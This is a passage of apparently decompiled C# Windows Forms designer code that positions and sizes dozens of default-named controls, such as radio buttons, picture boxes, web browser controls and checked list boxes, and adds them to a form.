			this.TextBox9.TabIndex = 234;
			this.RadioButton17.AutoSize = true;
			this.RadioButton17.Location = new Point(436, 240);
			this.RadioButton17.Name = "RadioButton17";
			this.RadioButton17.Size = new Size(96, 17);
			this.RadioButton17.TabIndex = 233;
			this.RadioButton17.TabStop = true;
			this.RadioButton17.Text = "RadioButton17";
			this.RadioButton17.UseVisualStyleBackColor = true;
			this.RadioButton18.AutoSize = true;
			this.RadioButton18.Location = new Point(37, 273);
			this.RadioButton18.Name = "RadioButton18";
			this.RadioButton18.Size = new Size(96, 17);
			this.RadioButton18.TabIndex = 232;
			this.RadioButton18.TabStop = true;
			this.RadioButton18.Text = "RadioButton18";
			this.RadioButton18.UseVisualStyleBackColor = true;
			this.PictureBox34.Location = new Point(181, 254);
			this.PictureBox34.Name = "PictureBox34";
			this.PictureBox34.Size = new Size(97, 86);
			this.PictureBox34.TabIndex = 231;
			this.PictureBox34.TabStop = false;
			this.ComboBox17.FormattingEnabled = true;
			this.ComboBox17.Location = new Point(133, 254);
			this.ComboBox17.Name = "ComboBox17";
			this.ComboBox17.Size = new Size(146, 21);
			this.ComboBox17.TabIndex = 230;
			this.Label9.AutoSize = true;
			this.Label9.Location = new Point(29, 282);
			this.Label9.Name = "Label9";
			this.Label9.Size = new Size(39, 13);
			this.Label9.TabIndex = 229;
			this.Label9.Text = "Label9";
			this.ListView9.HideSelection = false;
			this.ListView9.Location = new Point(-14, 201);
			this.ListView9.Name = "ListView9";
			this.ListView9.Size = new Size(173, 27);
			this.ListView9.TabIndex = 228;
			this.ListView9.UseCompatibleStateImageBehavior = false;
			this.DateTimePicker17.Location = new Point(232, 182);
			this.DateTimePicker17.Name = "DateTimePicker17";
			this.DateTimePicker17.Size = new Size(200, 20);
			this.DateTimePicker17.TabIndex = 227;
			this.MonthCalendar9.Location = new Point(427, 240);
			this.MonthCalendar9.Name = "MonthCalendar9";
			this.MonthCalendar9.TabIndex = 226;
			this.PictureBox35.Location = new Point(292, 164);
			this.PictureBox35.Name = "PictureBox35";
			this.PictureBox35.Size = new Size(201, 91);
			this.PictureBox35.TabIndex = 225;
			this.PictureBox35.TabStop = false;
			this.NumericUpDown18.Location = new Point(55, 366);
			this.NumericUpDown18.Name = "NumericUpDown18";
			this.NumericUpDown18.Size = new Size(38, 20);
			this.NumericUpDown18.TabIndex = 224;
			this.ProgressBar9.Location = new Point(2, 128);
			this.ProgressBar9.Name = "ProgressBar9";
			this.ProgressBar9.Size = new Size(36, 75);
			this.ProgressBar9.TabIndex = 223;
			this.PictureBox36.Location = new Point(412, 358);
			this.PictureBox36.Name = "PictureBox36";
			this.PictureBox36.Size = new Size(249, 71);
			this.PictureBox36.TabIndex = 222;
			this.PictureBox36.TabStop = false;
			this.MaskedTextBox17.Location = new Point(159, 385);
			this.MaskedTextBox17.Name = "MaskedTextBox17";
			this.MaskedTextBox17.Size = new Size(154, 20);
			this.MaskedTextBox17.TabIndex = 221;
			this.ComboBox18.FormattingEnabled = true;
			this.ComboBox18.Location = new Point(482, 231);
			this.ComboBox18.Name = "ComboBox18";
			this.ComboBox18.Size = new Size(118, 21);
			this.ComboBox18.TabIndex = 220;
			this.CheckedListBox25.FormattingEnabled = true;
			this.CheckedListBox25.Location = new Point(232, 221);
			this.CheckedListBox25.Name = "CheckedListBox25";
			this.CheckedListBox25.Size = new Size(174, 4);
			this.CheckedListBox25.TabIndex = 219;
			this.DateTimePicker18.Location = new Point(134, 210);
			this.DateTimePicker18.Name = "DateTimePicker18";
			this.DateTimePicker18.Size = new Size(91, 20);
			this.DateTimePicker18.TabIndex = 218;
			this.CheckedListBox26.FormattingEnabled = true;
			this.CheckedListBox26.Location = new Point(206, 164);
			this.CheckedListBox26.Name = "CheckedListBox26";
			this.CheckedListBox26.Size = new Size(90, 19);
			this.CheckedListBox26.TabIndex = 217;
			this.CheckedListBox27.FormattingEnabled = true;
			this.CheckedListBox27.Location = new Point(139, 273);
			this.CheckedListBox27.Name = "CheckedListBox27";
			this.CheckedListBox27.Size = new Size(310, 64);
			this.CheckedListBox27.TabIndex = 216;
			this.MaskedTextBox18.Location = new Point(694, 325);
			this.MaskedTextBox18.Name = "MaskedTextBox18";
			this.MaskedTextBox18.Size = new Size(41, 20);
			this.MaskedTextBox18.TabIndex = 215;
			this.NumericUpDown19.Location = new Point(652, 246);
			this.NumericUpDown19.Name = "NumericUpDown19";
			this.NumericUpDown19.Size = new Size(84, 20);
			this.NumericUpDown19.TabIndex = 214;
			this.PictureBox37.Location = new Point(104, 125);
			this.PictureBox37.Name = "PictureBox37";
			this.PictureBox37.Size = new Size(94, 31);
			this.PictureBox37.TabIndex = 213;
			this.PictureBox37.TabStop = false;
			this.WebBrowser10.Location = new Point(517, 120);
			this.WebBrowser10.MinimumSize = new Size(20, 20);
			this.WebBrowser10.Name = "WebBrowser10";
			this.WebBrowser10.Size = new Size(171, 90);
			this.WebBrowser10.TabIndex = 212;
			this.TreeView10.Location = new Point(269, 341);
			this.TreeView10.Name = "TreeView10";
			this.TreeView10.Size = new Size(135, 50);
			this.TreeView10.TabIndex = 211;
			this.TextBox10.Location = new Point(316, 309);
			this.TextBox10.Name = "TextBox10";
			this.TextBox10.Size = new Size(107, 20);
			this.TextBox10.TabIndex = 210;
			this.RadioButton19.AutoSize = true;
			this.RadioButton19.Location = new Point(428, 232);
			this.RadioButton19.Name = "RadioButton19";
			this.RadioButton19.Size = new Size(96, 17);
			this.RadioButton19.TabIndex = 209;
			this.RadioButton19.TabStop = true;
			this.RadioButton19.Text = "RadioButton19";
			this.RadioButton19.UseVisualStyleBackColor = true;
			this.RadioButton20.AutoSize = true;
			this.RadioButton20.Location = new Point(29, 265);
			this.RadioButton20.Name = "RadioButton20";
			this.RadioButton20.Size = new Size(96, 17);
			this.RadioButton20.TabIndex = 208;
			this.RadioButton20.TabStop = true;
			this.RadioButton20.Text = "RadioButton20";
			this.RadioButton20.UseVisualStyleBackColor = true;
			this.PictureBox38.Location = new Point(173, 246);
			this.PictureBox38.Name = "PictureBox38";
			this.PictureBox38.Size = new Size(97, 86);
			this.PictureBox38.TabIndex = 207;
			this.PictureBox38.TabStop = false;
			this.ComboBox19.FormattingEnabled = true;
			this.ComboBox19.Location = new Point(125, 246);
			this.ComboBox19.Name = "ComboBox19";
			this.ComboBox19.Size = new Size(146, 21);
			this.ComboBox19.TabIndex = 206;
			this.Label10.AutoSize = true;
			this.Label10.Location = new Point(21, 274);
			this.Label10.Name = "Label10";
			this.Label10.Size = new Size(45, 13);
			this.Label10.TabIndex = 205;
			this.Label10.Text = "Label10";
			this.ListView10.HideSelection = false;
			this.ListView10.Location = new Point(-22, 193);
			this.ListView10.Name = "ListView10";
			this.ListView10.Size = new Size(173, 27);
			this.ListView10.TabIndex = 204;
			this.ListView10.UseCompatibleStateImageBehavior = false;
			this.DateTimePicker19.Location = new Point(224, 174);
			this.DateTimePicker19.Name = "DateTimePicker19";
			this.DateTimePicker19.Size = new Size(200, 20);
			this.DateTimePicker19.TabIndex = 203;
			this.MonthCalendar10.Location = new Point(419, 232);
			this.MonthCalendar10.Name = "MonthCalendar10";
			this.MonthCalendar10.TabIndex = 202;
			this.PictureBox39.Location = new Point(284, 156);
			this.PictureBox39.Name = "PictureBox39";
			this.PictureBox39.Size = new Size(201, 91);
			this.PictureBox39.TabIndex = 201;
			this.PictureBox39.TabStop = false;
			this.NumericUpDown20.Location = new Point(47, 358);
			this.NumericUpDown20.Name = "NumericUpDown20";
			this.NumericUpDown20.Size = new Size(38, 20);
			this.NumericUpDown20.TabIndex = 200;
			this.ProgressBar10.Location = new Point(-6, 120);
			this.ProgressBar10.Name = "ProgressBar10";
			this.ProgressBar10.Size = new Size(36, 75);
			this.ProgressBar10.TabIndex = 199;
			this.PictureBox40.Location = new Point(404, 350);
			this.PictureBox40.Name = "PictureBox40";
			this.PictureBox40.Size = new Size(249, 71);
			this.PictureBox40.TabIndex = 198;
			this.PictureBox40.TabStop = false;
			this.MaskedTextBox19.Location = new Point(151, 377);
			this.MaskedTextBox19.Name = "MaskedTextBox19";
			this.MaskedTextBox19.Size = new Size(154, 20);
			this.MaskedTextBox19.TabIndex = 197;
			this.ComboBox20.FormattingEnabled = true;
			this.ComboBox20.Location = new Point(474, 223);
			this.ComboBox20.Name = "ComboBox20";
			this.ComboBox20.Size = new Size(118, 21);
			this.ComboBox20.TabIndex = 196;
			this.CheckedListBox28.FormattingEnabled = true;
			this.CheckedListBox28.Location = new Point(224, 213);
			this.CheckedListBox28.Name = "CheckedListBox28";
			this.CheckedListBox28.Size = new Size(174, 4);
			this.CheckedListBox28.TabIndex = 195;
			this.DateTimePicker20.Location = new Point(126, 202);
			this.DateTimePicker20.Name = "DateTimePicker20";
			this.DateTimePicker20.Size = new Size(91, 20);
			this.DateTimePicker20.TabIndex = 194;
			this.CheckedListBox29.FormattingEnabled = true;
			this.CheckedListBox29.Location = new Point(198, 156);
			this.CheckedListBox29.Name = "CheckedListBox29";
			this.CheckedListBox29.Size = new Size(90, 19);
			this.CheckedListBox29.TabIndex = 193;
			this.CheckedListBox30.FormattingEnabled = true;
			this.CheckedListBox30.Location = new Point(131, 265);
			this.CheckedListBox30.Name = "CheckedListBox30";
			this.CheckedListBox30.Size = new Size(310, 64);
			this.CheckedListBox30.TabIndex = 192;
			this.MaskedTextBox20.Location = new Point(686, 317);
			this.MaskedTextBox20.Name = "MaskedTextBox20";
			this.MaskedTextBox20.Size = new Size(41, 20);
			this.MaskedTextBox20.TabIndex = 191;
			this.NumericUpDown21.Location = new Point(644, 238);
			this.NumericUpDown21.Name = "NumericUpDown21";
			this.NumericUpDown21.Size = new Size(84, 20);
			this.NumericUpDown21.TabIndex = 190;
			this.PictureBox41.Location = new Point(96, 117);
			this.PictureBox41.Name = "PictureBox41";
			this.PictureBox41.Size = new Size(94, 31);
			this.PictureBox41.TabIndex = 189;
			this.PictureBox41.TabStop = false;
			this.WebBrowser11.Location = new Point(509, 112);
			this.WebBrowser11.MinimumSize = new Size(20, 20);
			this.WebBrowser11.Name = "WebBrowser11";
			this.WebBrowser11.Size = new Size(171, 90);
			this.WebBrowser11.TabIndex = 188;
			this.TreeView11.Location = new Point(261, 333);
			this.TreeView11.Name = "TreeView11";
			this.TreeView11.Size = new Size(135, 50);
			this.TreeView11.TabIndex = 187;
			this.TextBox11.Location = new Point(308, 301);
			this.TextBox11.Name = "TextBox11";
			this.TextBox11.Size = new Size(107, 20);
			this.TextBox11.TabIndex = 186;
			this.RadioButton21.AutoSize = true;
			this.RadioButton21.Location = new Point(420, 224);
			this.RadioButton21.Name = "RadioButton21";
			this.RadioButton21.Size = new Size(96, 17);
			this.RadioButton21.TabIndex = 185;
			this.RadioButton21.TabStop = true;
			this.RadioButton21.Text = "RadioButton21";
			this.RadioButton21.UseVisualStyleBackColor = true;
			this.RadioButton22.AutoSize = true;
			this.RadioButton22.Location = new Point(21, 257);
			this.RadioButton22.Name = "RadioButton22";
			this.RadioButton22.Size = new Size(96, 17);
			this.RadioButton22.TabIndex = 184;
			this.RadioButton22.TabStop = true;
			this.RadioButton22.Text = "RadioButton22";
			this.RadioButton22.UseVisualStyleBackColor = true;
			this.PictureBox42.Location = new Point(165, 238);
			this.PictureBox42.Name = "PictureBox42";
			this.PictureBox42.Size = new Size(97, 86);
			this.PictureBox42.TabIndex = 183;
			this.PictureBox42.TabStop = false;
			this.ComboBox21.FormattingEnabled = true;
			this.ComboBox21.Location = new Point(117, 238);
			this.ComboBox21.Name = "ComboBox21";
			this.ComboBox21.Size = new Size(146, 21);
			this.ComboBox21.TabIndex = 182;
			this.Label11.AutoSize = true;
			this.Label11.Location = new Point(13, 266);
			this.Label11.Name = "Label11";
			this.Label11.Size = new Size(45, 13);
			this.Label11.TabIndex = 181;
			this.Label11.Text = "Label11";
			this.ListView11.HideSelection = false;
			this.ListView11.Location = new Point(-30, 185);
			this.ListView11.Name = "ListView11";
			this.ListView11.Size = new Size(173, 27);
			this.ListView11.TabIndex = 180;
			this.ListView11.UseCompatibleStateImageBehavior = false;
			this.DateTimePicker21.Location = new Point(216, 166);
			this.DateTimePicker21.Name = "DateTimePicker21";
			this.DateTimePicker21.Size = new Size(200, 20);
			this.DateTimePicker21.TabIndex = 179;
			this.MonthCalendar11.Location = new Point(411, 224);
			this.MonthCalendar11.Name = "MonthCalendar11";
			this.MonthCalendar11.TabIndex = 178;
			this.PictureBox43.Location = new Point(276, 148);
			this.PictureBox43.Name = "PictureBox43";
			this.PictureBox43.Size = new Size(201, 91);
			this.PictureBox43.TabIndex = 177;
			this.PictureBox43.TabStop = false;
			this.NumericUpDown22.Location = new Point(39, 350);
			this.NumericUpDown22.Name = "NumericUpDown22";
			this.NumericUpDown22.Size = new Size(38, 20);
			this.NumericUpDown22.TabIndex = 176;
			this.ProgressBar11.Location = new Point(-14, 112);
			this.ProgressBar11.Name = "ProgressBar11";
			this.ProgressBar11.Size = new Size(36, 75);
			this.ProgressBar11.TabIndex = 175;
			this.PictureBox44.Location = new Point(396, 342);
			this.PictureBox44.Name = "PictureBox44";
			this.PictureBox44.Size = new Size(249, 71);
			this.PictureBox44.TabIndex = 174;
			this.PictureBox44.TabStop = false;
			this.MaskedTextBox21.Location = new Point(143, 369);
			this.MaskedTextBox21.Name = "MaskedTextBox21";
			this.MaskedTextBox21.Size = new Size(154, 20);
			this.MaskedTextBox21.TabIndex = 173;
			this.ComboBox22.FormattingEnabled = true;
			this.ComboBox22.Location = new Point(466, 215);
			this.ComboBox22.Name = "ComboBox22";
			this.ComboBox22.Size = new Size(118, 21);
			this.ComboBox22.TabIndex = 172;
			this.CheckedListBox31.FormattingEnabled = true;
			this.CheckedListBox31.Location = new Point(216, 205);
			this.CheckedListBox31.Name = "CheckedListBox31";
			this.CheckedListBox31.Size = new Size(174, 4);
			this.CheckedListBox31.TabIndex = 171;
			this.DateTimePicker22.Location = new Point(118, 194);
			this.DateTimePicker22.Name = "DateTimePicker22";
			this.DateTimePicker22.Size = new Size(91, 20);
			this.DateTimePicker22.TabIndex = 170;
			this.CheckedListBox32.FormattingEnabled = true;
			this.CheckedListBox32.Location = new Point(190, 148);
			this.CheckedListBox32.Name = "CheckedListBox32";
			this.CheckedListBox32.Size = new Size(90, 19);
			this.CheckedListBox32.TabIndex = 169;
			this.CheckedListBox33.FormattingEnabled = true;
			this.CheckedListBox33.Location = new Point(123, 257);
			this.CheckedListBox33.Name = "CheckedListBox33";
			this.CheckedListBox33.Size = new Size(310, 64);
			this.CheckedListBox33.TabIndex = 168;
			this.MaskedTextBox22.Location = new Point(676, 273);
			this.MaskedTextBox22.Name = "MaskedTextBox22";
			this.MaskedTextBox22.Size = new Size(41, 20);
			this.MaskedTextBox22.TabIndex = 167;
			this.NumericUpDown23.Location = new Point(634, 194);
			this.NumericUpDown23.Name = "NumericUpDown23";
			this.NumericUpDown23.Size = new Size(84, 20);
			this.NumericUpDown23.TabIndex = 166;
			this.PictureBox45.Location = new Point(86, 73);
			this.PictureBox45.Name = "PictureBox45";
			this.PictureBox45.Size = new Size(94, 31);
			this.PictureBox45.TabIndex = 165;
			this.PictureBox45.TabStop = false;
			this.WebBrowser12.Location = new Point(499, 68);
			this.WebBrowser12.MinimumSize = new Size(20, 20);
			this.WebBrowser12.Name = "WebBrowser12";
			this.WebBrowser12.Size = new Size(171, 90);
			this.WebBrowser12.TabIndex = 164;
			this.TreeView12.Location = new Point(251, 289);
			this.TreeView12.Name = "TreeView12";
			this.TreeView12.Size = new Size(135, 50);
			this.TreeView12.TabIndex = 163;
			this.TextBox12.Location = new Point(298, 257);
			this.TextBox12.Name = "TextBox12";
			this.TextBox12.Size = new Size(107, 20);
			this.TextBox12.TabIndex = 162;
			this.RadioButton23.AutoSize = true;
			this.RadioButton23.Location = new Point(410, 180);
			this.RadioButton23.Name = "RadioButton23";
			this.RadioButton23.Size = new Size(96, 17);
			this.RadioButton23.TabIndex = 161;
			this.RadioButton23.TabStop = true;
			this.RadioButton23.Text = "RadioButton23";
			this.RadioButton23.UseVisualStyleBackColor = true;
			this.RadioButton24.AutoSize = true;
			this.RadioButton24.Location = new Point(11, 213);
			this.RadioButton24.Name = "RadioButton24";
			this.RadioButton24.Size = new Size(96, 17);
			this.RadioButton24.TabIndex = 160;
			this.RadioButton24.TabStop = true;
			this.RadioButton24.Text = "RadioButton24";
			this.RadioButton24.UseVisualStyleBackColor = true;
			this.PictureBox46.Location = new Point(155, 194);
			this.PictureBox46.Name = "PictureBox46";
			this.PictureBox46.Size = new Size(97, 86);
			this.PictureBox46.TabIndex = 159;
			this.PictureBox46.TabStop = false;
			this.ComboBox23.FormattingEnabled = true;
			this.ComboBox23.Location = new Point(107, 194);
			this.ComboBox23.Name = "ComboBox23";
			this.ComboBox23.Size = new Size(146, 21);
			this.ComboBox23.TabIndex = 158;
			this.Label12.AutoSize = true;
			this.Label12.Location = new Point(3, 222);
			this.Label12.Name = "Label12";
			this.Label12.Size = new Size(45, 13);
			this.Label12.TabIndex = 157;
			this.Label12.Text = "Label12";
			this.ListView12.HideSelection = false;
			this.ListView12.Location = new Point(-40, 141);
			this.ListView12.Name = "ListView12";
			this.ListView12.Size = new Size(173, 27);
			this.ListView12.TabIndex = 156;
			this.ListView12.UseCompatibleStateImageBehavior = false;
			this.DateTimePicker23.Location = new Point(206, 122);
			this.DateTimePicker23.Name = "DateTimePicker23";
			this.DateTimePicker23.Size = new Size(200, 20);
			this.DateTimePicker23.TabIndex = 155;
			this.MonthCalendar12.Location = new Point(401, 180);
			this.MonthCalendar12.Name = "MonthCalendar12";
			this.MonthCalendar12.TabIndex = 154;
			this.PictureBox47.Location = new Point(266, 104);
			this.PictureBox47.Name = "PictureBox47";
			this.PictureBox47.Size = new Size(201, 91);
			this.PictureBox47.TabIndex = 153;
			this.PictureBox47.TabStop = false;
			this.NumericUpDown24.Location = new Point(29, 306);
			this.NumericUpDown24.Name = "NumericUpDown24";
			this.NumericUpDown24.Size = new Size(38, 20);
			this.NumericUpDown24.TabIndex = 152;
			this.ProgressBar12.Location = new Point(-24, 68);
			this.ProgressBar12.Name = "ProgressBar12";
			this.ProgressBar12.Size = new Size(36, 75);
			this.ProgressBar12.TabIndex = 151;
			this.PictureBox48.Location = new Point(386, 298);
			this.PictureBox48.Name = "PictureBox48";
			this.PictureBox48.Size = new Size(249, 71);
			this.PictureBox48.TabIndex = 150;
			this.PictureBox48.TabStop = false;
			this.MaskedTextBox23.Location = new Point(133, 325);
			this.MaskedTextBox23.Name = "MaskedTextBox23";
			this.MaskedTextBox23.Size = new Size(154, 20);
			this.MaskedTextBox23.TabIndex = 149;
			this.ComboBox24.FormattingEnabled = true;
			this.ComboBox24.Location = new Point(456, 171);
			this.ComboBox24.Name = "ComboBox24";
			this.ComboBox24.Size = new Size(118, 21);
			this.ComboBox24.TabIndex = 148;
			this.CheckedListBox34.FormattingEnabled = true;
			this.CheckedListBox34.Location = new Point(206, 161);
			this.CheckedListBox34.Name = "CheckedListBox34";
			this.CheckedListBox34.Size = new Size(174, 4);
			this.CheckedListBox34.TabIndex = 147;
			this.DateTimePicker24.Location = new Point(108, 150);
			this.DateTimePicker24.Name = "DateTimePicker24";
			this.DateTimePicker24.Size = new Size(91, 20);
			this.DateTimePicker24.TabIndex = 146;
			this.CheckedListBox35.FormattingEnabled = true;
			this.CheckedListBox35.Location = new Point(180, 104);
			this.CheckedListBox35.Name = "CheckedListBox35";
			this.CheckedListBox35.Size = new Size(90, 19);
			this.CheckedListBox35.TabIndex = 145;
			this.CheckedListBox36.FormattingEnabled = true;
			this.CheckedListBox36.Location = new Point(113, 213);
			this.CheckedListBox36.Name = "CheckedListBox36";
			this.CheckedListBox36.Size = new Size(310, 64);
			this.CheckedListBox36.TabIndex = 144;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(800, 407);
			base.Controls.Add(this.MaskedTextBox13);
			base.Controls.Add(this.NumericUpDown13);
			base.Controls.Add(this.PictureBox25);
			base.Controls.Add(this.WebBrowser7);
			base.Controls.Add(this.TreeView7);
			base.Controls.Add(this.TextBox7);
			base.Controls.Add(this.RadioButton13);
			base.Controls.Add(this.RadioButton14);
			base.Controls.Add(this.PictureBox26);
			base.Controls.Add(this.ComboBox13);
			base.Controls.Add(this.Label7);
			base.Controls.Add(this.ListView7);
			base.Controls.Add(this.DateTimePicker13);
			base.Controls.Add(this.MonthCalendar7);
			base.Controls.Add(this.PictureBox27);
			base.Controls.Add(this.NumericUpDown14);
			base.Controls.Add(this.ProgressBar7);
			base.Controls.Add(this.PictureBox28);
			base.Controls.Add(this.MaskedTextBox14);
			base.Controls.Add(this.ComboBox14);
			base.Controls.Add(this.CheckedListBox19);
			base.Controls.Add(this.DateTimePicker14);
			base.Controls.Add(this.CheckedListBox20);
			base.Controls.Add(this.CheckedListBox21);
			base.Controls.Add(this.MaskedTextBox15);
			base.Controls.Add(this.NumericUpDown15);
			base.Controls.Add(this.PictureBox29);
			base.Controls.Add(this.WebBrowser8);
			base.Controls.Add(this.TreeView8);
			base.Controls.Add(this.TextBox8);
			base.Controls.Add(this.RadioButton15);
			base.Controls.Add(this.RadioButton16);
			base.Controls.Add(this.PictureBox30);
			base.Controls.Add(this.ComboBox15);
			base.Controls.Add(this.Label8);
			base.Controls.Add(this.ListView8);
			base.Controls.Add(this.DateTimePicker15);
			base.Controls.Add(this.MonthCalendar8);
			base.Controls.Add(this.PictureBox31);
			base.Controls.Add(this.NumericUpDown16);
			base.Controls.Add(this.ProgressBar8);
			base.Controls.Add(this.PictureBox32);
			base.Controls.Add(this.MaskedTextBox16);
			base.Controls.Add(this.ComboBox16);
			base.Controls.Add(this.CheckedListBox22);
			base.Controls.Add(this.DateTimePicker16);
			base.Controls.Add(this.CheckedListBox23);
			base.Controls.Add(this.CheckedListBox24);
			base.Controls.Add(this.NumericUpDown17);
			base.Controls.Add(this.PictureBox33);
			base.Controls.Add(this.WebBrowser9);
			base.Controls.Add(this.TreeView9);
			base.Controls.Add(this.TextBox9);
			base.Controls.Add(this.RadioButton17);
			base.Controls.Add(this.RadioButton18);
			base.Controls.Add(this.PictureBox34);
			base.Controls.Add(this.ComboBox17);
			base.Controls.Add(this.Label9);
			base.Controls.Add(this.ListView9);
			base.Controls.Add(this.DateTimePicker17);
			base.Controls.Add(this.MonthCalendar9);
			base.Controls.Add(this.PictureBox35);
			base.Controls.Add(this.NumericUpDown18);
			base.Controls.Add(this.ProgressBar9);
			base.Controls.Add(this.PictureBox36);
			base.Controls.Add(this.MaskedTextBox17);
			base.Controls.Add(this.ComboBox18);
			base.Controls.Add(this.CheckedListBox25);
			base.Controls.Add(this.DateTimePicker18);
			base.Controls.Add(this.CheckedListBox26);
			base.Controls.Add(this.CheckedListBox27);
			base.Controls.Add(this.MaskedTextBox18);
			base.Controls.Add(this.NumericUpDown19);
			base.Controls.Add(this.PictureBox37);
			base.Controls.Add(this.WebBrowser10);
			base.Controls.Add(this.TreeView10);
			base.Controls.Add(this.TextBox10);
			base.Controls.Add(this.RadioButton19);
			base.Controls.Add(this.RadioButton20);
			base.Controls.Add(this.PictureBox38);
			base.Controls.Add(this.ComboBox19);
			base.Controls.Add(this.Label10);
			base.Controls.Add(this.ListView10);
			base.Controls.Add(this.DateTimePicker19);
			base.Controls.Add(this.MonthCalendar10);
			base.Controls.Add(this.PictureBox39);
			base.Controls.Add(this.NumericUpDown20);
			base.Controls.Add(this.ProgressBar10);
			base.Controls.Add(this.PictureBox40);
			base.Controls.Add(this.MaskedTextBox19);
			base.Controls.Add(this.ComboBox20);
			base.Controls.Add(this.CheckedListBox28);
			base.Controls.Add(this.DateTimePicker20);
			base.Controls.Add(this.CheckedListBox29);
			base.Controls.Add(this.CheckedListBox30);
			base.Controls.Add(this.MaskedTextBox20);
			base.Controls.Add(this.NumericUpDown21);
			base.Controls.Add(this.PictureBox41);
			base.Controls.Add(this.WebBrowser11);
			base.Controls.Add(this.TreeView11);
			base.Controls.Add(this.TextBox11);
			base.Controls.Add(this.RadioButton21);
			base.Controls.Add(this.RadioButton22);
			base.Controls.Add(this.PictureBox42);
			base.Controls.Add(this.ComboBox21);
			base.Controls.Add(this.Label11);
			base.Controls.Add(this.ListView11);
			base.Controls.Add(this.DateTimePicker21);
			base.Controls.Add(this.MonthCalendar11);
			base.Controls.Add(this.PictureBox43);
			base.Controls.Add(this.NumericUpDown22);
			base.Controls.Add(this.ProgressBar11);
			base.Controls.Add(this.PictureBox44);
			base.Controls.Add(this.MaskedTextBox21);
			base.Controls.Add(this.ComboBox22);
			base.Controls.Add(this.CheckedListBox31);
			base.Controls.Add(this.DateTimePicker22);
			base.Controls.Add(this.CheckedListBox32);
			base.Controls.Add(this.CheckedListBox33);
			base.Controls.Add(this.MaskedTextBox22);
			base.Controls.Add(this.NumericUpDown23);
			base.Controls.Add(this.PictureBox45);
			base.Controls.Add(this.WebBrowser12);
			base.Controls.Add(this.TreeView12);
			base.Controls.Add(this.TextBox12);
			base.Controls.Add(this.RadioButton23);
			base.Controls.Add(this.RadioButton24);
			base.Controls.Add(this.PictureBox46);
			base.Controls.Add(this.ComboBox23);
			base.Controls.Add(this.Label12);
			base.Controls.Add(this.ListView12);
			base.Controls.Add(this.DateTimePicker23);
			base.Controls.Add(this.MonthCalendar12);
			base.Controls.Add(this.PictureBox47);
			base.Controls.Add(this.NumericUpDown24);
			base.Controls.Add(this.ProgressBar12);
			base.Controls.Add(this.PictureBox48);
			base.Controls.Add(this.MaskedTextBox23);
			base.Controls.Add(this.ComboBox24);
			base.Controls.Add(this.CheckedListBox34);
			base.Controls.Add(this.DateTimePicker24);
			base.Controls.Add(this.CheckedListBox35);
			base.Controls.Add(this.CheckedListBox36);
			base.Controls.Add(this.MaskedTextBox11);
			base.Controls.Add(this.NumericUpDown11);
			base.Controls.Add(this.PictureBox21);
			base.Controls.Add(this.WebBrowser6);
			base.Controls.Add(this.TreeView6);
			base.Controls.Add(this.TextBox6);
			base.Controls.Add(this.RadioButton11);
			base.Controls.Add(this.RadioButton12);
			base.Controls.Add(this.PictureBox22);
			base.Controls.Add(this.ComboBox11);
			base.Controls.Add(this.Label6);
			base.Controls.Add(this.ListView6);
			base.Controls.Add(this.DateTimePicker11);
			base.Controls.Add(this.MonthCalendar6);
			base.Controls.Add(this.PictureBox23);
			base.Controls.Add(this.NumericUpDown12);
			base.Controls.Add(this.ProgressBar6);
			base.Controls.Add(this.PictureBox24);
			base.Controls.Add(this.MaskedTextBox12);
			base.Controls.Add(this.ComboBox12);
			base.Controls.Add(this.CheckedListBox16);
			base.Controls.Add(this.DateTimePicker12);
			base.Controls.Add(this.CheckedListBox17);
			base.Controls.Add(this.CheckedListBox18);
			base.Controls.Add(this.MaskedTextBox9);
			base.Controls.Add(this.NumericUpDown9);
			base.Controls.Add(this.PictureBox17);
			base.Controls.Add(this.WebBrowser5);
			base.Controls.Add(this.TreeView5);
			base.Controls.Add(this.TextBox5);
			base.Controls.Add(this.RadioButton9);
			base.Controls.Add(this.RadioButton10);
			base.Controls.Add(this.PictureBox18);
			base.Controls.Add(this.ComboBox9);
			base.Controls.Add(this.Label5);
			base.Controls.Add(this.ListView5);
			base.Controls.Add(this.DateTimePicker9);
			base.Controls.Add(this.MonthCalendar5);
			base.Controls.Add(this.PictureBox19);
			base.Controls.Add(this.NumericUpDown10);
			base.Controls.Add(this.ProgressBar5);
			base.Controls.Add(this.PictureBox20);
			base.Controls.Add(this.MaskedTextBox10);
			base.Controls.Add(this.ComboBox10);
			base.Controls.Add(this.CheckedListBox13);
			base.Controls.Add(this.DateTimePicker10);
			base.Controls.Add(this.CheckedListBox14);
			base.Controls.Add(this.CheckedListBox15);
			base.Controls.Add(this.MaskedTextBox7);
			base.Controls.Add(this.NumericUpDown7);
			base.Controls.Add(this.PictureBox13);
			base.Controls.Add(this.WebBrowser4);
			base.Controls.Add(this.TreeView4);
			base.Controls.Add(this.TextBox4);
			base.Controls.Add(this.RadioButton7);
			base.Controls.Add(this.RadioButton8);
			base.Controls.Add(this.PictureBox14);
			base.Controls.Add(this.ComboBox7);
			base.Controls.Add(this.Label4);
			base.Controls.Add(this.ListView4);
			base.Controls.Add(this.DateTimePicker7);
			base.Controls.Add(this.MonthCalendar4);
			base.Controls.Add(this.PictureBox15);
			base.Controls.Add(this.NumericUpDown8);
			base.Controls.Add(this.ProgressBar4);
			base.Controls.Add(this.PictureBox16);
			base.Controls.Add(this.MaskedTextBox8);
			base.Controls.Add(this.ComboBox8);
			base.Controls.Add(this.CheckedListBox10);
			base.Controls.Add(this.DateTimePicker8);
			base.Controls.Add(this.CheckedListBox11);
			base.Controls.Add(this.CheckedListBox12);
			base.Controls.Add(this.MaskedTextBox5);
			base.Controls.Add(this.NumericUpDown5);
			base.Controls.Add(this.PictureBox9);
			base.Controls.Add(this.WebBrowser3);
			base.Controls.Add(this.TreeView3);
			base.Controls.Add(this.TextBox3);
			base.Controls.Add(this.RadioButton5);
			base.Controls.Add(this.RadioButton6);
			base.Controls.Add(this.PictureBox10);
			base.Controls.Add(this.ComboBox5);
			base.Controls.Add(this.Label3);
			base.Controls.Add(this.ListView3);
			base.Controls.Add(this.DateTimePicker5);
			base.Controls.Add(this.MonthCalendar3);
			base.Controls.Add(this.PictureBox11);
			base.Controls.Add(this.NumericUpDown6);
			base.Controls.Add(this.ProgressBar3);
			base.Controls.Add(this.PictureBox12);
			base.Controls.Add(this.MaskedTextBox6);
			base.Controls.Add(this.ComboBox6);
			base.Controls.Add(this.CheckedListBox7);
			base.Controls.Add(this.DateTimePicker6);
			base.Controls.Add(this.CheckedListBox8);
			base.Controls.Add(this.CheckedListBox9);
